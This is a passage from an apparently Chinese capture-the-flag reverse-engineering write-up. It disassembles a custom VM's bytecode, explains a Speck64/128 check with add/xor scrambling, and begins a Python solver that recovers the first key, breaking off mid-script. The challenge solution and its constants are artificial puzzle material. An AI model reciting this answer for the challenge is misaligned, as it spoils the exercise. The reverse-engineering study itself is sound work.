class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">05a9: setp1 0xe000</span><br><span class="line">05ac: loadp1_off r0, 0x0010</span><br><span class="line">05b0: mov r5, r0</span><br><span class="line">05b3: push r5</span><br><span class="line">05b5: mov_imm r5, 0x48f0e6421ac66dea</span><br><span class="line">05bf: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">05c9: push r6</span><br><span class="line">05cb: push r7</span><br><span class="line">05cd: mov_imm r6, 0x0000000000000001</span><br><span class="line">05d7: mov r7, r5</span><br><span class="line">05da: and r7, r6</span><br><span class="line">05dd: xor r5, r6</span><br><span class="line">05e0: cmp_imm r7, 0x0000000000000000</span><br><span class="line">05ea: je 0x05f6</span><br><span class="line">05ed: shl r7, 0x01</span><br><span class="line">05f0: mov r6, r7</span><br><span class="line">05f3: jmp 0x05d7</span><br><span class="line">05f6: pop r7</span><br><span class="line">05f8: pop r6</span><br><span class="line">05fa: push r6</span><br><span class="line">05fc: push r7</span><br><span class="line">05fe: mov r6, r5</span><br><span class="line">0601: mov r7, r0</span><br><span class="line">0604: and r7, r6</span><br><span class="line">0607: xor r0, r6</span><br><span class="line">060a: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0614: je 0x0620</span><br><span class="line">0617: shl r7, 0x01</span><br><span class="line">061a: mov r6, r7</span><br><span class="line">061d: jmp 0x0601</span><br><span class="line">0620: and_imm r0, 0xffffffffffffffff</span><br><span class="line">062a: pop r7</span><br><span class="line">062c: pop r6</span><br><span class="line">062e: and_imm r0, 0xffffffffffffffff</span><br><span class="line">0638: pop r5</span><br><span class="line">063a: xor_imm r0, 0x5074d85b9194e696</span><br><span class="line">0644: push r5</span><br><span class="line">0646: mov_imm r5, 0x5566488c9c5cf234</span><br><span class="line">0650: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">065a: push r6</span><br><span class="line">065c: push r7</span><br><span class="line">065e: mov_imm r6, 0x0000000000000001</span><br><span class="line">0668: mov r7, r5</span><br><span class="line">066b: and r7, r6</span><br><span class="line">066e: xor r5, r6</span><br><span class="line">0671: cmp_imm r7, 0x0000000000000000</span><br><span class="line">067b: je 0x0687</span><br><span class="line">067e: shl r7, 0x01</span><br><span class="line">0681: mov r6, r7</span><br><span class="line">0684: jmp 0x0668</span><br><span class="line">0687: pop r7</span><br><span class="line">0689: pop r6</span><br><span class="line">068b: push r6</span><br><span class="line">068d: push r7</span><br><span class="line">068f: mov r6, r5</span><br><span class="line">0692: mov r7, r0</span><br><span class="line">0695: and r7, r6</span><br><span class="line">0698: xor r0, r6</span><br><span class="line">069b: cmp_imm r7, 0x0000000000000000</span><br><span class="line">06a5: je 0x06b1</span><br><span class="line">06a8: shl r7, 0x01</span><br><span class="line">06ab: mov r6, r7</span><br><span class="line">06ae: jmp 0x0692</span><br><span class="line">06b1: and_imm r0, 0xffffffffffffffff</span><br><span class="line">06bb: pop r7</span><br><span class="line">06bd: pop r6</span><br><span class="line">06bf: and_imm r0, 0xffffffffffffffff</span><br><span class="line">06c9: pop r5</span><br><span class="line">06cb: xor_imm r0, 0x8cb331163a92fc19</span><br><span class="line">06d5: setp1 0x7200</span><br><span class="line">06d8: mov_imm r1, 0x36b1cc9fe433713d</span><br><span class="line">06e2: storep1 r1</span><br><span class="line">06e4: push r0</span><br><span class="line">06e6: mov_imm r0, 0x0000000000000008</span><br><span class="line">06f0: addp1_reg r0</span><br><span class="line">06f2: pop r0</span><br></pre></td></tr></table></figure><p>伪C逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">inverse_transform</span><span class="params">(<span class="type">uint64_t</span> y)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> C1 = <span class="number">0x48f0e6421ac66deaU</span>LL;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> K1 = <span class="number">0x5074d85b9194e696U</span>LL;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> C2 = <span class="number">0x5566488c9c5cf234U</span>LL;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> K2 = <span class="number">0x8cb331163a92fc19U</span>LL;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> MASK = <span class="number">0xFFFFFFFFFFFFFFFFU</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> x3 = (y ^ K2);</span><br><span class="line">    <span class="type">uint64_t</span> x2 = (x3 + C2) &amp; MASK;</span><br><span class="line">    <span class="type">uint64_t</span> x1 = (x2 ^ K1);</span><br><span class="line">    <span class="type">uint64_t</span> x  = (x1 + C1) &amp; MASK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 disasm_vm.py 0x02be 0x0715</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line">02be: push r0</span><br><span class="line">02c0: push r1</span><br><span class="line">02c2: push r2</span><br><span class="line">02c4: push r3</span><br><span class="line">02c6: push r4</span><br><span class="line">02c8: push r5</span><br><span class="line">02ca: push r6</span><br><span class="line">02cc: push r7</span><br><span class="line">02ce: mov r1, r0</span><br><span class="line">02d1: shr r1, 0x20</span><br><span class="line">02d4: and_imm r0, 0x00000000ffffffff</span><br><span class="line">02de: loadp1 r2</span><br><span class="line">02e0: push r0</span><br><span class="line">02e2: mov_imm r0, 0x0000000000000008</span><br><span class="line">02ec: addp1_reg r0</span><br><span class="line">02ee: pop r0</span><br><span class="line">02f0: loadp1 r3</span><br><span class="line">02f2: push r0</span><br><span class="line">02f4: mov_imm r0, 0x0000000000000008</span><br><span class="line">02fe: push r5</span><br><span class="line">0300: mov_imm r5, 0x0000000000000010</span><br><span class="line">030a: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">0314: push r6</span><br><span class="line">0316: push r7</span><br><span class="line">0318: mov_imm r6, 0x0000000000000001</span><br><span class="line">0322: mov r7, r5</span><br><span class="line">0325: and r7, r6</span><br><span class="line">0328: xor r5, r6</span><br><span class="line">032b: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0335: je 0x0341</span><br><span class="line">0338: shl r7, 0x01</span><br><span class="line">033b: mov r6, r7</span><br><span class="line">033e: jmp 0x0322</span><br><span class="line">0341: pop r7</span><br><span class="line">0343: pop r6</span><br><span class="line">0345: push r6</span><br><span class="line">0347: push r7</span><br><span class="line">0349: mov r6, r5</span><br><span class="line">034c: mov r7, r0</span><br><span class="line">034f: and r7, r6</span><br><span class="line">0352: xor r0, r6</span><br><span class="line">0355: cmp_imm r7, 0x0000000000000000</span><br><span class="line">035f: je 0x036b</span><br><span class="line">0362: shl r7, 0x01</span><br><span class="line">0365: mov r6, r7</span><br><span class="line">0368: jmp 0x034c</span><br><span class="line">036b: and_imm r0, 0xffffffffffffffff</span><br><span class="line">0375: pop r7</span><br><span class="line">0377: pop r6</span><br><span class="line">0379: and_imm r0, 0xffffffffffffffff</span><br><span class="line">0383: pop r5</span><br><span class="line">0385: addp1_reg r0</span><br><span class="line">0387: pop r0</span><br><span class="line">0389: mov r4, r2</span><br><span class="line">038c: mov r5, r3</span><br><span class="line">038f: and_imm r2, 0x00000000ffffffff</span><br><span class="line">0399: shr r4, 0x20</span><br><span class="line">039c: and_imm r3, 0x00000000ffffffff</span><br><span class="line">03a6: shr r5, 0x20</span><br><span class="line">03a9: push r7</span><br><span class="line">03ab: mov r7, r3</span><br><span class="line">03ae: mov r3, r4</span><br><span class="line">03b1: mov r4, r7</span><br><span class="line">03b4: pop r7</span><br><span class="line">03b6: mov_imm r6, 0x0000000000000000</span><br><span class="line">03c0: push r7</span><br><span class="line">03c2: mov r7, r0</span><br><span class="line">03c5: push r6</span><br><span class="line">03c7: push r7</span><br><span class="line">03c9: mov r6, r7</span><br><span class="line">03cc: mov r7, r7</span><br><span class="line">03cf: shr r6, 0x08</span><br><span class="line">03d2: shl r7, 0x18</span><br><span class="line">03d5: xor r6, r7</span><br><span class="line">03d8: and_imm r6, 0x00000000ffffffff</span><br><span class="line">03e2: pop r7</span><br><span class="line">03e4: mov r7, r6</span><br><span class="line">03e7: pop r6</span><br><span class="line">03e9: mov r0, r7</span><br><span class="line">03ec: push r6</span><br><span class="line">03ee: push r7</span><br><span class="line">03f0: mov r6, r1</span><br><span class="line">03f3: mov r7, r0</span><br><span class="line">03f6: and r7, r6</span><br><span class="line">03f9: xor r0, r6</span><br><span class="line">03fc: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0406: je 0x0412</span><br><span class="line">0409: shl r7, 0x01</span><br><span class="line">040c: mov r6, r7</span><br><span class="line">040f: jmp 0x03f3</span><br><span class="line">0412: and_imm r0, 0xffffffffffffffff</span><br><span class="line">041c: pop r7</span><br><span class="line">041e: pop r6</span><br><span class="line">0420: and_imm r0, 0x00000000ffffffff</span><br><span class="line">042a: xor r0, r2</span><br><span class="line">042d: and_imm r0, 0x00000000ffffffff</span><br><span class="line">0437: mov r7, r1</span><br><span class="line">043a: push r6</span><br><span class="line">043c: push r7</span><br><span class="line">043e: mov r6, r7</span><br><span class="line">0441: mov r7, r7</span><br><span class="line">0444: shl r6, 0x03</span><br><span class="line">0447: shr r7, 0x1d</span><br><span class="line">044a: xor r6, r7</span><br><span class="line">044d: and_imm r6, 0x00000000ffffffff</span><br><span class="line">0457: pop r7</span><br><span class="line">0459: mov r7, r6</span><br><span class="line">045c: pop r6</span><br><span class="line">045e: mov r1, r7</span><br><span class="line">0461: xor r1, r0</span><br><span class="line">0464: and_imm r1, 0x00000000ffffffff</span><br><span class="line">046e: pop r7</span><br><span class="line">0470: cmp_imm r6, 0x000000000000001a</span><br><span class="line">047a: je 0x054a</span><br><span class="line">047d: push r0</span><br><span class="line">047f: push r1</span><br><span class="line">0481: mov r0, r3</span><br><span class="line">0484: mov r1, r2</span><br><span class="line">0487: mov r2, r6</span><br><span class="line">048a: push r7</span><br><span class="line">048c: mov r7, r0</span><br><span class="line">048f: push r6</span><br><span class="line">0491: push r7</span><br><span class="line">0493: mov r6, r7</span><br><span class="line">0496: mov r7, r7</span><br><span class="line">0499: shr r6, 0x08</span><br><span class="line">049c: shl r7, 0x18</span><br><span class="line">049f: xor r6, r7</span><br><span class="line">04a2: and_imm r6, 0x00000000ffffffff</span><br><span class="line">04ac: pop r7</span><br><span class="line">04ae: mov r7, r6</span><br><span class="line">04b1: pop r6</span><br><span class="line">04b3: mov r0, r7</span><br><span class="line">04b6: push r6</span><br><span class="line">04b8: push r7</span><br><span class="line">04ba: mov r6, r1</span><br><span class="line">04bd: mov r7, r0</span><br><span class="line">04c0: and r7, r6</span><br><span class="line">04c3: xor r0, r6</span><br><span class="line">04c6: cmp_imm r7, 0x0000000000000000</span><br><span class="line">04d0: je 0x04dc</span><br><span class="line">04d3: shl r7, 0x01</span><br><span class="line">04d6: mov r6, r7</span><br><span class="line">04d9: jmp 0x04bd</span><br><span class="line">04dc: and_imm r0, 0xffffffffffffffff</span><br><span class="line">04e6: pop r7</span><br><span class="line">04e8: pop r6</span><br><span class="line">04ea: and_imm r0, 0x00000000ffffffff</span><br><span class="line">04f4: xor r0, r2</span><br><span class="line">04f7: and_imm r0, 0x00000000ffffffff</span><br><span class="line">0501: mov r7, r1</span><br><span class="line">0504: push r6</span><br><span class="line">0506: push r7</span><br><span class="line">0508: mov r6, r7</span><br><span class="line">050b: mov r7, r7</span><br><span class="line">050e: shl r6, 0x03</span><br><span class="line">0511: shr r7, 0x1d</span><br><span class="line">0514: xor r6, r7</span><br><span class="line">0517: and_imm r6, 0x00000000ffffffff</span><br><span class="line">0521: pop r7</span><br><span class="line">0523: mov r7, r6</span><br><span class="line">0526: pop r6</span><br><span class="line">0528: mov r1, r7</span><br><span class="line">052b: xor r1, r0</span><br><span class="line">052e: and_imm r1, 0x00000000ffffffff</span><br><span class="line">0538: pop r7</span><br><span class="line">053a: mov r2, r1</span><br><span class="line">053d: mov r3, r4</span><br><span class="line">0540: mov r4, r5</span><br><span class="line">0543: mov r5, r0</span><br><span class="line">0546: pop r1</span><br><span class="line">0548: pop r0</span><br><span class="line">054a: inc r6</span><br><span class="line">054c: cmp_imm r6, 0x000000000000001b</span><br><span class="line">0556: je 0x055c</span><br><span class="line">0559: jmp 0x03c0</span><br><span class="line">055c: shl r1, 0x20</span><br><span class="line">055f: push r6</span><br><span class="line">0561: push r7</span><br><span class="line">0563: mov r6, r1</span><br><span class="line">0566: mov r7, r0</span><br><span class="line">0569: and r7, r6</span><br><span class="line">056c: xor r0, r6</span><br><span class="line">056f: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0579: je 0x0585</span><br><span class="line">057c: shl r7, 0x01</span><br><span class="line">057f: mov r6, r7</span><br><span class="line">0582: jmp 0x0566</span><br><span class="line">0585: and_imm r0, 0xffffffffffffffff</span><br><span class="line">058f: pop r7</span><br><span class="line">0591: pop r6</span><br><span class="line">0593: pop r7</span><br><span class="line">0595: pop r6</span><br><span class="line">0597: pop r5</span><br><span class="line">0599: pop r4</span><br><span class="line">059b: pop r3</span><br><span class="line">059d: pop r2</span><br><span class="line">059f: pop r1</span><br><span class="line">05a1: pop r6</span><br><span class="line">05a3: ret</span><br><span class="line">05a4: store_call 0x20</span><br><span class="line">05a6: jmp 0x0003</span><br><span class="line">05a9: setp1 0xe000</span><br><span class="line">05ac: loadp1_off r0, 0x0010</span><br><span class="line">05b0: mov r5, r0</span><br><span class="line">05b3: push r5</span><br><span class="line">05b5: mov_imm r5, 0x48f0e6421ac66dea</span><br><span class="line">05bf: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">05c9: push r6</span><br><span class="line">05cb: push r7</span><br><span class="line">05cd: mov_imm r6, 0x0000000000000001</span><br><span class="line">05d7: mov r7, r5</span><br><span class="line">05da: and r7, r6</span><br><span class="line">05dd: xor r5, r6</span><br><span class="line">05e0: cmp_imm r7, 0x0000000000000000</span><br><span class="line">05ea: je 0x05f6</span><br><span class="line">05ed: shl r7, 0x01</span><br><span class="line">05f0: mov r6, r7</span><br><span class="line">05f3: jmp 0x05d7</span><br><span class="line">05f6: pop r7</span><br><span class="line">05f8: pop r6</span><br><span class="line">05fa: push r6</span><br><span class="line">05fc: push r7</span><br><span class="line">05fe: mov r6, r5</span><br><span class="line">0601: mov r7, r0</span><br><span class="line">0604: and r7, r6</span><br><span class="line">0607: xor r0, r6</span><br><span class="line">060a: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0614: je 0x0620</span><br><span class="line">0617: shl r7, 0x01</span><br><span class="line">061a: mov r6, r7</span><br><span class="line">061d: jmp 0x0601</span><br><span class="line">0620: and_imm r0, 0xffffffffffffffff</span><br><span class="line">062a: pop r7</span><br><span class="line">062c: pop r6</span><br><span class="line">062e: and_imm r0, 0xffffffffffffffff</span><br><span class="line">0638: pop r5</span><br><span class="line">063a: xor_imm r0, 0x5074d85b9194e696</span><br><span class="line">0644: push r5</span><br><span class="line">0646: mov_imm r5, 0x5566488c9c5cf234</span><br><span class="line">0650: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">065a: push r6</span><br><span class="line">065c: push r7</span><br><span class="line">065e: mov_imm r6, 0x0000000000000001</span><br><span class="line">0668: mov r7, r5</span><br><span class="line">066b: and r7, r6</span><br><span class="line">066e: xor r5, r6</span><br><span class="line">0671: cmp_imm r7, 0x0000000000000000</span><br><span class="line">067b: je 0x0687</span><br><span class="line">067e: shl r7, 0x01</span><br><span class="line">0681: mov r6, r7</span><br><span class="line">0684: jmp 0x0668</span><br><span class="line">0687: pop r7</span><br><span class="line">0689: pop r6</span><br><span class="line">068b: push r6</span><br><span class="line">068d: push r7</span><br><span class="line">068f: mov r6, r5</span><br><span class="line">0692: mov r7, r0</span><br><span class="line">0695: and r7, r6</span><br><span class="line">0698: xor r0, r6</span><br><span class="line">069b: cmp_imm r7, 0x0000000000000000</span><br><span class="line">06a5: je 0x06b1</span><br><span class="line">06a8: shl r7, 0x01</span><br><span class="line">06ab: mov r6, r7</span><br><span class="line">06ae: jmp 0x0692</span><br><span class="line">06b1: and_imm r0, 0xffffffffffffffff</span><br><span class="line">06bb: pop r7</span><br><span class="line">06bd: pop r6</span><br><span class="line">06bf: and_imm r0, 0xffffffffffffffff</span><br><span class="line">06c9: pop r5</span><br><span class="line">06cb: xor_imm r0, 0x8cb331163a92fc19</span><br><span class="line">06d5: setp1 0x7200</span><br><span class="line">06d8: mov_imm r1, 0x36b1cc9fe433713d</span><br><span class="line">06e2: storep1 r1</span><br><span class="line">06e4: push r0</span><br><span class="line">06e6: mov_imm r0, 0x0000000000000008</span><br><span class="line">06f0: addp1_reg r0</span><br><span class="line">06f2: pop r0</span><br><span class="line">06f4: mov_imm r1, 0xf97646d69c84ebd8</span><br><span class="line">06fe: storep1 r1</span><br><span class="line">0700: setp1 0x7200</span><br><span class="line">0703: call 0x20</span><br><span class="line">0705: cmp_imm r0, 0xda19ba6b81c83f61</span><br><span class="line">070f: je 0x0715</span><br><span class="line">0712: call 0x01</span><br><span class="line">0714: halt</span><br></pre></td></tr></table></figure><blockquote><p>我放在一起了</p><p>其实应该是</p><p>python3 disasm_vm.py 0x02be 0x055c，也就是 call-table 入口 0x20 所指向的那段字节码（起始 full_vmcode:0x02be，结束 0x05a3），文件里就是那次 call 0x20 的完整被调函数。</p><p>入口 full_vmcode:0x05a9–0x0714（用 python3 disasm_vm.py 0x5a9 0x714 可再现），它负责从 0xE010 取 key、做两次可逆的加&#x2F;异或混淆、执行 Speck 调用并比较结果；2) 被调用的 call 0x20 代码，即 layer1_call20.asm 中 full_vmcode:0x02be–0x05a3 的那大段嵌套循环<br>（Speck64&#x2F;128 实现）。把两段拼在一起就是“第一次处理”的完整指令流。</p></blockquote><p>求解第一个key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Model the outermost VM layer and recover the first 64-bit key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The layer performs a couple of invertible 64-bit add/xor scramblings on the</span></span><br><span class="line"><span class="string">user-controlled key and then runs a 27-round Speck64/128 encryption on the</span></span><br><span class="line"><span class="string">result with a fixed 128-bit key.  The Speck output must equal the constant</span></span><br><span class="line"><span class="string">`0xDA19BA6B81C83F61`, so we can invert the whole chain and recover the key.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">MASK64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">ROUNDS = <span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Constants pulled directly from the first-layer bytecode near 0x05b0.</span></span><br><span class="line">CONST_SUB_1 = <span class="number">0x48F0_E642_1AC6_6DEA</span></span><br><span class="line">CONST_SUB_2 = <span class="number">0x5566_488C_9C5C_F234</span></span><br><span class="line">CONST_XOR_1 = <span class="number">0x5074_D85B_9194_E696</span></span><br><span class="line">CONST_XOR_2 = <span class="number">0x8CB3_3116_3A92_FC19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Speck key material written to VM memory at 0x7200 before the call.</span></span><br><span class="line">SPECK_KEY_WORDS = [</span><br><span class="line">    <span class="number">0xE433_713D</span>,</span><br><span class="line">    <span class="number">0x36B1_CC9F</span>,</span><br><span class="line">    <span class="number">0x9C84_EBD8</span>,</span><br><span class="line">    <span class="number">0xF976_46D6</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ciphertext that the VM compares against after the Speck call.</span></span><br><span class="line">TARGET_CT = <span class="number">0xDA19_BA6B_81C8_3F61</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_rol32</span>(<span class="params">x: <span class="built_in">int</span>, r: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_ror32</span>(<span class="params">x: <span class="built_in">int</span>, r: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span 